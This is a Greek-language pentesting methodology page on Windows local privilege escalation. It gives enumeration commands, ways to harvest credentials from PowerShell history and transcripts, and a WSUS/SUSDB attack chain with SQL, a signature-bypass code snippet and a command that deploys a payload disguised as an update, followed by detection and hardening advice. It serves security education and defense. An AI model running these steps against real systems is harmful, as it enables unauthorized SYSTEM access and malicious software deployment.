# Κλιμάκωση τοπικών προνομίων στα Windows

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για την αναζήτηση φορέων τοπικής κλιμάκωσης προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Αυτή η σελίδα συγκεντρώνει τη γενική μεθοδολογία κλιμάκωσης προνομίων στα Windows από αρκετούς θεμελιώδεις οδηγούς.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Η πρακτική ροή απαρίθμησης βασίζεται επίσης σε εργαστήρια και λίστες ελέγχου της κοινότητας.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Το ιστορικό υλικό επιθέσεων περιλαμβάνει την παρουσίαση της DerbyCon για την κλιμάκωση προνομίων στα Windows.<sup>[[5]](#references)</sup>

## Αρχικές θεωρητικές έννοιες των Windows

### Access Tokens

**Αν δεν γνωρίζετε τι είναι τα access tokens των Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs, δείτε την παρακάτω σελίδα:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Επίπεδα ακεραιότητας

**Αν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Μηχανισμοί ασφαλείας των Windows

Υπάρχουν διάφοροι μηχανισμοί στα Windows που θα μπορούσαν να **σας εμποδίσουν να απαριθμήσετε το σύστημα**, να εκτελέσετε εκτελέσιμα αρχεία ή ακόμη και να **εντοπίσουν τις ενέργειές σας**. Πριν ξεκινήσετε την απαρίθμηση για κλιμάκωση προνομίων, θα πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να **απαριθμήσετε** όλους αυτούς τους **μηχανισμούς άμυνας**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Η φυσική πρόσβαση μπορεί επίσης να μετατρέψει μια offline τροποποίηση του UEFI NVRAM σε αλυσίδα DMA πριν από την εκκίνηση και τροποποίησης μνήμης των Windows με δικαιώματα `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Προστασία διαχειριστή / αθόρυβη ανύψωση δικαιωμάτων UIAccess

Οι διεργασίες UIAccess που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να χρησιμοποιηθούν καταχρηστικά για την απόκτηση High IL χωρίς προτροπές, όταν παρακάμπτονται οι έλεγχοι ασφαλούς διαδρομής του AppInfo. Δείτε εδώ τη σχετική ροή παράκαμψης UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η διάδοση του μητρώου προσβασιμότητας του Secure Desktop μπορεί να χρησιμοποιηθεί καταχρηστικά για αυθαίρετη εγγραφή στο μητρώο με δικαιώματα SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Οι πρόσφατες εκδόσεις των Windows εισήγαγαν επίσης μια διαδρομή LPE μέσω **SMB σε αυθαίρετη θύρα**, όπου μια τοπική αυθεντικοποίηση NTLM με προνόμια ανακλάται μέσω μιας επαναχρησιμοποιημένης σύνδεσης SMB TCP:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Πληροφορίες συστήματος

### Απαρίθμηση πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει γνωστές ευπάθειες (ελέγξτε επίσης τις εφαρμοσμένες ενημερώσεις κώδικα).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits ανά έκδοση

Αυτός ο [ιστότοπος](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιλαμβάνει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας την **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Το Winpeas περιλαμβάνει ενσωματωμένο το watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — καταγράφει το build του λειτουργικού συστήματος, τις εγκατεστημένες ενημερώσεις και επιλεγμένες πιθανές συμβουλές ασφαλείας· επαληθεύστε το ακριβές προϊόν και τις ενημερώσεις που τις αντικαθιστούν πριν θεωρήσετε ότι ένα αποτέλεσμα ισχύει.

Για ένα local exploit που αφορά συγκεκριμένη έκδοση, ελέγξτε τόσο την αρχιτεκτονική της **εκτελούμενης διεργασίας** όσο και την αρχιτεκτονική του λειτουργικού συστήματος. Σε Windows 64-bit, μια διεργασία 32-bit υπόκειται σε [ανακατεύθυνση συστήματος αρχείων WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): το `%windir%\System32` συνήθως οδηγεί στον κατάλογο συστήματος 32-bit, ενώ το `%windir%\Sysnative` παρέχει σε αυτή τη διεργασία πρόσβαση στον εγγενή κατάλογο συστήματος. Το ψευδώνυμο δεν είναι διαθέσιμο σε διεργασία 64-bit. Το build του λειτουργικού συστήματος ή η υποψήφια ενημέρωση KB που λείπει δεν αποδεικνύουν ότι είναι εφικτή η εκμετάλλευση· συγκρίνετε το τρέχον build, τις εγκατεστημένες ενημερώσεις ή όσες τις αντικαθιστούν, την αρχιτεκτονική της διεργασίας και τις προϋποθέσεις του exploit με το [δελτίο ασφαλείας της Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) για το συγκεκριμένο ζήτημα.

Για παράδειγμα αλλοίωσης μνήμης υπηρεσίας, δείτε τις [θέσεις των offsets στον δακτύλιο κοινόχρηστης μνήμης MIDI που ελέγχονται από τον client](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Τα δημοσιευμένα stack offsets ισχύουν μόνο για το build που δοκιμάστηκε· η απόκτηση πρόσβασης ως `LOCAL SERVICE` είναι διαφορετική από το επόμενο βήμα [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) για μετάβαση σε `SYSTEM`.<sup>[[44]](#references)</sup>

**Τοπικά, με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Αποθετήρια GitHub με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν αποθηκευμένα διαπιστευτήρια ή άλλες χρήσιμες πληροφορίες στις μεταβλητές περιβάλλοντος;

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Ιστορικό PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Αρχεία καταγραφής Transcription του PowerShell

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε εδώ: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` είναι μόνο ένα παράδειγμα. Η [πολιτική απομαγνητοφώνησης του PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) συνήθως αποθηκεύει τα αρχεία στον φάκελο Documents κάθε χρήστη, αλλά μια ρύθμιση `OutputDirectory` ή η εντολή `Start-Transcript -OutputDirectory` μπορεί να ανακατευθύνει τα αρχεία σε κοινόχρηστο ή κρυφό φάκελο. Ελέγξτε την ενεργή διαδρομή εξόδου και τα ACL των αρχείων πριν εξετάσετε μια απομαγνητοφώνηση: μπορεί να περιέχει ορίσματα εντολών και έξοδο, συμπεριλαμβανομένων διαπιστευτηρίων. Μια αναγνώσιμη απομαγνητοφώνηση αποτελεί χρήσιμο στοιχείο μόνο όταν το περιεχόμενό της αποκαλύπτει μια αξιοποιήσιμη ταυτότητα με υψηλότερα δικαιώματα και αυτή η ταυτότητα μπορεί να συνδεθεί στο σχετικό περιβάλλον.

### PowerShell Module Logging

Καταγράφονται λεπτομέρειες των εκτελέσεων του pipeline του PowerShell, συμπεριλαμβανομένων των εντολών που εκτελέστηκαν, των κλήσεων εντολών και τμημάτων των scripts. Ωστόσο, ενδέχεται να μην καταγραφούν όλες οι λεπτομέρειες της εκτέλεσης και τα αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης και επιλέξτε **"Module Logging"** αντί για **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Για να δείτε τα τελευταία 15 συμβάντα από τα αρχεία καταγραφής του PowersShell, μπορείτε να εκτελέσετε:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Καταγράφεται πλήρως η δραστηριότητα και το περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι τεκμηριώνεται κάθε μπλοκ κώδικα καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο ίχνος ελέγχου κάθε δραστηριότητας, χρήσιμο για την εγκληματολογική ανάλυση και την εξέταση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση κάθε δραστηριότητας κατά την εκτέλεσή της, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Τα συμβάντα καταγραφής για το Script Block βρίσκονται στο Windows Event Viewer, στη διαδρομή: **Αρχεία καταγραφής εφαρμογών και υπηρεσιών > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα 20 πιο πρόσφατα συμβάντα, μπορείτε να χρησιμοποιήσετε:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ρυθμίσεις Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Μονάδες δίσκου

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Οι προηγούμενες οδηγίες συνόψιζαν τον κίνδυνο ως εξής:

Μπορείτε να παραβιάσετε το σύστημα αν οι ενημερώσεις ζητούνται μέσω http και όχι μέσω http**S**.

Ένα HTTP WSUS endpoint αποτελεί ένδειξη για διερεύνηση πιθανής υποκλοπής των metadata των ενημερώσεων. Η εκμετάλλευση εξαρτάται επίσης από το αν ο client χρησιμοποιεί αυτόν τον WSUS server, από το αν ένας attacker μπορεί να υποκλέψει ή να ελέγξει την κίνησή του και από την πολιτική εμπιστοσύνης και εγκατάστασης ενημερώσεων του client. Το URL από μόνο του δεν αποδεικνύει ότι είναι δυνατή η εκτέλεση κώδικα. [Η Microsoft συνιστά τη χρήση TLS για τα metadata του WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ξεκινήστε ελέγχοντας αν το δίκτυο χρησιμοποιεί ενημερώσεις WSUS χωρίς SSL, εκτελώντας τα εξής στο cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ή τα παρακάτω στο PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Αν λάβεις μια απάντηση όπως μία από τις παρακάτω:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Και αν τα `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσα με `1`.

Η αρχική δήλωση σχετικά με τη δυνατότητα εκμετάλλευσης ήταν:

Τότε, **είναι ευάλωτο σε εκμετάλλευση.** Αν η τελευταία τιμή μητρώου είναι ίση με 0, τότε η καταχώριση WSUS θα αγνοηθεί.

Όταν το `UseWUServer` είναι `1`, το Windows Update χρησιμοποιεί την καθορισμένη υπηρεσία intranet. Αυτό επιβεβαιώνει μια προϋπόθεση για τη διαδρομή υποκλοπής HTTP, αλλά δεν αποδεικνύει ότι είναι δυνατή η υποκλοπή, η αποδοχή κακόβουλων ενημερώσεων ή η εγκατάσταση με αυξημένα δικαιώματα. Όταν είναι `0`, αυτό το συγκεκριμένο διαμορφωμένο endpoint WSUS δεν επιλέγεται από αυτή την πολιτική.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες, μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Αυτά είναι weaponized exploit scripts MiTM για την εισαγωγή «ψεύτικων» ενημερώσεων σε κίνηση WSUS χωρίς SSL.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Βασικά, αυτό είναι το ελάττωμα που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον τοπικό proxy χρήστη μας και το Windows Update χρησιμοποιεί τον proxy που έχει διαμορφωθεί στις ρυθμίσεις του Internet Explorer, τότε μπορούμε να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά, να υποκλέψουμε τη δική μας κίνηση και να εκτελέσουμε κώδικα με αυξημένα δικαιώματα στο σύστημά μας.
>
> Επιπλέον, καθώς η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, χρησιμοποιεί επίσης το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το hostname WSUS και προσθέσουμε αυτό το certificate στο certificate store του τρέχοντος χρήστη, θα μπορούμε να υποκλέψουμε κίνηση WSUS τόσο μέσω HTTP όσο και μέσω HTTPS. Το WSUS δεν χρησιμοποιεί μηχανισμούς παρόμοιους με το HSTS για να εφαρμόσει επικύρωση τύπου trust-on-first-use στο certificate. Αν το certificate που παρουσιάζεται είναι έμπιστο για τον χρήστη και έχει το σωστό hostname, θα γίνει αποδεκτό από την υπηρεσία.

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις κυκλοφορήσει).

### Ενημερώσεις WSUS που ελέγχονται από διαχειριστή

Υπάρχει ξεχωριστή διαδρομή όταν η τρέχουσα ταυτότητα μπορεί να **δημοσιεύει και να εγκρίνει** ενημερώσεις σε έναν διακομιστή WSUS. Ελέγξτε την αποτελεσματική συμμετοχή στην ομάδα `WSUS Administrators` του διακομιστή και τυχόν δικαιώματα WSUS που έχουν εκχωρηθεί, και στη συνέχεια εντοπίστε την ομάδα υπολογιστών-πελατών που θα λάβει μια εγκεκριμένη ενημέρωση. Η [Microsoft απαιτεί δικαιώματα WSUS Administrator για την έγκριση ενημερώσεων](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) και [τεκμηριώνει τη σχέση εμπιστοσύνης για τη δημοσίευση](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): οι clients πρέπει να εμπιστεύονται το certificate υπογραφής που χρησιμοποιείται για περιεχόμενο που δημοσιεύεται τοπικά. Επιβεβαιώστε ότι η υποψήφια ενημέρωση είναι υπογεγραμμένη και γίνεται αποδεκτή, αφορά τον στόχο και εγκαθίσταται σε πιο προνομιούχο περιβάλλον, προτού τη θεωρήσετε διαδρομή κλιμάκωσης δικαιωμάτων. Μια τιμή HTTP `WUServer` ή ένα όνομα ομάδας από μόνα τους δεν αποδεικνύουν ότι ισχύουν αυτές οι συνθήκες.

### Κατάχρηση προσαρμοσμένων ενημερώσεων SUSDB: unsigned payloads μέσω `.txt`/`.esd`

Πρόκειται για διαφορετική αστοχία ορίου εμπιστοσύνης από την υποκλοπή μιας σύνδεσης HTTP WSUS: προϋπόθεση είναι η επαρκής πρόσβαση στις stored procedures της **βάσης δεδομένων WSUS (`SUSDB`)**, ώστε να δημοσιεύεται και να εγκρίνεται μια προσαρμοσμένη ενημέρωση. Μια πρακτική αρχική διαδρομή είναι η αναμετάδοση ενός λογαριασμού υπολογιστή WSUS upstream σε ξεχωριστό διακομιστή MSSQL που φιλοξενεί τη `SUSDB`. Η ακριβής προϋπόθεση εξαρτάται από την ανάπτυξη, επομένως πρώτα απαριθμήστε τα δικαιώματα `EXECUTE` αντί να υποθέσετε ότι απαιτούνται δικαιώματα διαχειριστή SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Για τη ξεχωριστή διαδρομή επίθεσης που αναμεταδίδει τον έλεγχο ταυτότητας WSUS client από HTTP/8530 σε LDAP, SMB ή AD CS, δείτε [Κατάχρηση του WSUS HTTP για NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Επιβεβαίωση του relay εξωτερικής βάσης δεδομένων και των δικαιωμάτων στις procedures

Σε εγκαταστάσεις όπου το WSUS χρησιμοποιεί εξωτερικό SQL Server, ελέγξτε πρώτα αν ο λογαριασμός του διακομιστή WSUS μπορεί να πραγματοποιήσει έλεγχο ταυτότητας στη βάση δεδομένων και αν το NTLM relay φτάνει στον listener. Ο ρόλος SQL του διακομιστή μπορεί να παρέχει πρόσβαση σε procedures δημοσίευσης ενημερώσεων, ακόμη κι όταν απαγορεύονται οι άμεσες εγγραφές στους πίνακες. Μια αποτυχημένη εντολή `UPDATE` στη `SUSDB` δεν αποδεικνύει ότι έχει αποκλειστεί η δημοσίευση. Εξετάστε την αποτελεσματική ταυτότητα, τη συμμετοχή σε ρόλους και τα δικαιώματα στις procedures σε μια εξουσιοδοτημένη συνεδρία SQL, πριν επιχειρήσετε να δημοσιεύσετε προσαρμοσμένη ενημέρωση.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Οι ορισμοί των ζωντανών διαδικασιών και το εγκατεστημένο `SoftwareDistributionPackage.xsd` είναι χρήσιμα για την ανακατασκευή έγκυρων μεταδεδομένων ενημέρωσης. Τόσο το γονικό bundle όσο και το θυγατρικό payload χρειάζονται `UpdateIdentity` (τύπος fragment `1`), `LocalizedProperties` (`4`) και `ExtendedProperties` (`2)`. Καταγράψτε το τοπικό revision ID που επιστρέφει κάθε κλήση `spImportUpdate` και διατηρήστε συνεπή τη σχέση του bundle, τα digests, το μέγεθος, το content URL και το revision. Πρόκειται για stateful workflow δημοσίευσης, επομένως μία επιτυχημένη κλήση stored procedure δεν αποδεικνύει ότι έγινε εκτέλεση στην πλευρά του client.<sup>[[38]](#references)</sup>

#### Δημιουργία, στόχευση και έγκριση της ενημέρωσης

Το workflow προσαρμοσμένης ενημέρωσης χρησιμοποιεί νόμιμες διαδικασίες WSUS ως περιορισμένο API δημοσίευσης. Οι σημαντικές μεταβάσεις κατάστασης είναι οι εξής:<sup>[[38]](#references)</sup>

| Στάδιο | Σχετικές stored procedures |
| --- | --- |
| Εισαγωγή μεταδεδομένων ενημέρωσης | `spImportUpdate` |
| Αποθήκευση XML fragments προαπαιτουμένων, τοπικών ρυθμίσεων και εκτεταμένων ιδιοτήτων | `spSaveXMLFragment` |
| Συσχέτιση του content digest με το URL που ελέγχει ο attacker | `spSetBatchURL` |
| Καταγραφή/δημιουργία computer group και προσθήκη του client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Έγκριση εγκατάστασης για εκείνη την ομάδα | `spDeployUpdate` με `@actionID = 0` και `@isAssigned = 1` |

Το όνομα αρχείου, τα digests, το μέγεθος και ο handler `CommandLineInstallation` πρέπει να συμφωνούν στα εισαγόμενα metadata/fragments. Αφού οριστούν το content URL και η ομάδα-στόχος, η τελική έγκριση μοιάζει με την παρακάτω· χρησιμοποιήστε νέα αναγνωριστικά ενημέρωσης, ομάδας και deployment, αντί να επαναχρησιμοποιήσετε τα GUID του παραδείγματος.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

Το WSUS συνήθως απορρίπτει αυθαίρετο μη υπογεγραμμένο εκτελέσιμο περιεχόμενο. Ωστόσο, στο `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, η διαδρομή .NET `VerifyFile` ορίζει τη σημαία ελέγχου πιστοποιητικού σε false όταν το παρεχόμενο όνομα αρχείου τελειώνει σε `.txt` ή `.esd`. Έτσι, παραλείπεται το `CheckCertificateSignature` χωρίς να έχει προηγουμένως επιβεβαιωθεί ότι τα bytes είναι κείμενο ή έγκυρη εικόνα ESD. Επομένως, ένα αμετάβλητο PE με όνομα, για παράδειγμα, `payload.exe.txt` μπορεί να περάσει την επαλήθευση περιεχομένου και στη συνέχεια να εκκινηθεί από τον handler εγκατάστασης της ενημέρωσης μέσω command-line. Πρόκειται για σφάλμα σύγχυσης πολιτικής/τύπου, όχι για πλαστογράφηση υπογραφής.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging και αυτοματοποίηση συμβατά με BITS

Η κλήση του `spDeployUpdate` κάνει το WSUS να ανακτήσει το καταχωρισμένο περιεχόμενο. Η προέλευση πρέπει να ικανοποιεί τις απαιτήσεις HTTP του BITS: δεν αρκεί απλώς να είναι προσβάσιμο το URL, καθώς η μεταφορά χρησιμοποιεί αρχική ροή `HEAD`/`GET` και αιτήματα εύρους byte. Ένας server χωρίς υποστήριξη Range προκαλεί συμβάν συγχρονισμού WSUS `EventId=364`, το οποίο αναφέρει ότι το BITS απαιτεί την κεφαλίδα πρωτοκόλλου Range.<sup>[[39]](#references)</sup>

Το ερευνητικό PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) δημιουργεί το SQL που απαιτείται για την αλυσίδα εισαγωγής/fragment/URL/group/deployment, περιλαμβάνει έναν τροποποιημένο MSSQL client για την εκτέλεσή του και παρέχει το `BitsWebServer.py` για το staging του περιεχομένου. Μια ελάχιστη εντολή εκτέλεσης σε εξουσιοδοτημένο lab είναι:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Μη επιτηρούμενη εκτέλεση και persistence επαναλήψεων

Η αλληλεπίδραση από την πλευρά του client εξαρτάται από την πολιτική. Η επιλογή `4 - Auto download and schedule install` στη ρύθμιση `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` επιτρέπει τη λήψη και εγκατάσταση μιας εγκεκριμένης ενημέρωσης στο διαμορφωμένο χρονοδιάγραμμα, χωρίς να χρειάζεται να την επιλέξει χειροκίνητα ο χρήστης. Σε δοκιμές, ένα payload του οποίου η ενημέρωση παρέμενε σε κατάσταση αποτυχίας/μη ολοκλήρωσης προσφερόταν ξανά αμέσως μετά την έξοδο της διεργασίας callback, οπότε η συμπεριφορά επανάληψης μπορεί να γίνει recurring execution persistence· είναι θορυβώδης, επειδή ο client εμφανίζει κατάσταση αποτυχίας ενημέρωσης.<sup>[[39]](#references)</sup>

#### Σημεία εστίασης για detection και hardening

Χρήσιμα σημεία εστίασης από την πλευρά του server και του client σε αυτήν την αλυσίδα είναι τα εξής:<sup>[[39]](#references)</sup>

- Κάντε audit της εκτέλεσης των `spCreateTargetGroup`, `spSetBatchURL` και `spDeployUpdate` στη `SUSDB`· διερευνήστε νέες ομάδες στόχευσης, εξωτερικές πηγές περιεχομένου, payload ενημερώσεων `.txt`/`.esd` και deployments από μη αναμενόμενα principals (ειδικά λογαριασμούς που δεν είναι λογαριασμοί υπολογιστών).
- Ελέγξτε το `C:\Program Files\Update Services\LogFiles` για τα `ContentSyncAgent`, `FileVerified`, το ανορθόγραφο `FileVerficationFailed` και το `EventId=364`· συσχετίστε την επαλήθευση με την επέκταση του payload και το magic του περιεχομένου, αντί να εμπιστεύεστε την κατάληξη.
- Αναζητήστε επαναλαμβανόμενες αποτυχίες/επαναλήψεις εγκατάστασης του Windows Update, καθώς και εκτέλεση PE ή μη αναμενόμενη δραστηριότητα child/network από περιεχόμενο με ονόματα `.txt` ή `.esd`.
- Απαιτήστε Extended Protection for Authentication στην υπηρεσία βάσης δεδομένων, όπου υποστηρίζεται, και περιορίστε την πρόσβαση δικτύου στη βάση δεδομένων στον server WSUS και σε εξουσιοδοτημένα διοικητικά συστήματα. Περιορίστε στο ελάχιστο και κάντε audit τα δικαιώματα `EXECUTE` στις διαδικασίες custom-update.

## Εργαλεία αυτόματης ενημέρωσης τρίτων και Agent IPC (local privesc)

